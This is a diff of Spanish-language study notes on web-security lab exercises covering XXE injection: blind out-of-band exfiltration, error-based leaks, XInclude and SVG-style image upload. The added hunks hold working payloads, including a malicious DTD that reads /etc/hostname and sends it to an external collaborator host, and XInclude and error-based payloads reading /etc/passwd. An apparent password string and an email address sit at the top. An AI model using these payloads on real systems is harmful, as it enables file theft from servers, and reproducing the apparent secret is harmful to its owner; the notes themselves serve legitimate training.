@@ -1,5 +1,5 @@
 [[RED TEAM]]
-
+eduardo.lazaro@heuristica-ti.com.mx
 2|653C[8Wr=J-rN"ygd,$495$Hg&k94}
 
 ---
@@ -142,9 +142,9 @@ Te: trailers
 </storeId>
 </stockCheck>
 ```
-![[Pasted image 20230814125036.png|1000]]
+![[Pasted image 20230814125036.png]]
 
-![[Pasted image 20230814125142.png|1000]]
+![[Pasted image 20230814125142.png]]
 
 ---
 
@@ -215,5 +215,96 @@ Para entender esto mejor, desglosemos los elementos clave:
     
 4. **Malicious external DTD**: Una DTD externa es una referencia a una definición de tipo de documento que se encuentra fuera del propio documento XML. Un atacante puede utilizar una DTD maliciosa para definir entidades que hacen referencia a recursos controlados por el atacante, como direcciones de IP o URLs. Esto permite al atacante llevar a cabo ataques de XXE ciegos y potencialmente extraer información sensible.
 
+```java
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://go8zndrgbyrm21o0bv6jkht9b0hr5it7.oastify.com/?content=%file;'>">
+%eval;
+%exfil;
+```
+```java
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ad500900314163a8220f54c012f00e8.exploit-server.net/exploit"> %xxe; ]>
+```
 
+![[Pasted image 20230817111331.png]]
+
+![[Pasted image 20230817113813.png]]
+
+![[Pasted image 20230817113843.png]]
+
+![[Pasted image 20230817113858.png]]
+
+---
+
+# Lab 6 : Exploiting blind XXE to retrieve data via error messages
+
+Se refiere a una técnica de explotación de la vulnerabilidad de XXE (XML External Entity) en la que un atacante intenta extraer información sensible de un sistema objetivo a través de mensajes de error generados por el servidor, incluso cuando no recibe una respuesta directa del servidor.
+
+Este laboratorio tiene una función llamada "Verificar stock" que analiza una entrada XML pero no muestra el resultado.,Para resolver el laboratorio, utiliza un DTD externo para provocar un mensaje de error que muestre el contenido del archivo /etc/passwd.
+El laboratorio contiene un enlace a un servidor de explotación en un dominio diferente donde puedes alojar tu DTD malicioso.
+
+![[Pasted image 20230817134112.png]]
+![[Pasted image 20230817134141.png]]
+
+```java
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///meloinvento/%file;'>">
+%eval;
+%exfil;
+```
+
+```java
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ab800560426ea4284fea4d4011200c2.exploit-server.net/exploit"> %xxe; ]>
+<stockCheck>
+<productId>
+2
+</productId>
+<storeId>
+1
+</storeId>
+</stockCheck>
+```
+---
+
+# Lab 7 : Exploiting XInclude to retrieve files
+
+"Exploiting XInclude to retrieve files" se refiere a una técnica de explotación que aprovecha la funcionalidad de inclusión XML (XInclude) para obtener acceso a archivos en un sistema. XInclude es una característica que permite a los documentos XML incluir contenido de otros documentos XML. Los atacantes pueden abusar de esta funcionalidad para acceder a archivos sensibles o confidenciales en un sistema objetivo.
+
+- **XInclude**: XInclude es una técnica utilizada en XML para combinar contenido de varios documentos XML en uno solo. Permite la inclusión de fragmentos de XML desde otros documentos utilizando la etiqueta `<xi:include>`.
+    
+- **Exploiting XInclude**: Los atacantes pueden abusar de XInclude para acceder a archivos en el sistema. Pueden manipular la entrada XML para incluir referencias a archivos locales o remotos y forzar al servidor a procesar esos archivos durante el análisis del XML.
+    
+- **Retrieve Files**: La explotación de XInclude para recuperar archivos implica que el atacante inserta una referencia a un archivo específico que desea acceder, como archivos de configuración, datos confidenciales o cualquier otro archivo en el sistema objetivo.
+![[Pasted image 20230817140650.png]]
+```java
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+```
+
+![[Pasted image 20230817140400.png]]
+
+---
+
+# Lab 8 : Exploiting XXE via image file upload
+
+
+"Exploiting XXE via image file upload" se refiere a una técnica de explotación de la vulnerabilidad de XXE (XML External Entity) que se realiza mediante la carga de archivos de imagen. Esta técnica implica aprovechar una vulnerabilidad en la capacidad de una aplicación para analizar archivos de imagen, como JPEG o PNG, y utilizarla para llevar a cabo un ataque XXE.
+
+Aquí hay una descripción más detallada de cómo funciona esta técnica:
+
+1. **XXE Vulnerability**: XXE es una vulnerabilidad en la que un atacante puede manipular entradas XML para incluir referencias a entidades externas. Estas entidades pueden ser utilizadas para acceder a recursos externos, como archivos en el servidor.
+    
+2. **Image File Upload**: Algunas aplicaciones permiten a los usuarios cargar archivos de imagen, como avatares o imágenes de perfil. Estos archivos de imagen suelen ser procesados por la aplicación.
+    
+3. **Exploiting XXE**: El atacante carga un archivo de imagen que contiene código malicioso disfrazado como metadatos XML en el archivo. Cuando la aplicación procesa el archivo de imagen, puede interpretar el contenido XML malicioso y llevar a cabo una explotación XXE.
+    
+4. **Impacto**: Dependiendo de cómo se configure la explotación, el atacante podría intentar acceder a archivos en el servidor, obtener información confidencial o realizar otras acciones maliciosas.
+
+![[Pasted image 20230817140948.png]]
+
+![[Pasted image 20230817141646.png]]
+
+![[Pasted image 20230817141657.png]]
+
+![[Pasted image 20230817141811.png]]
 
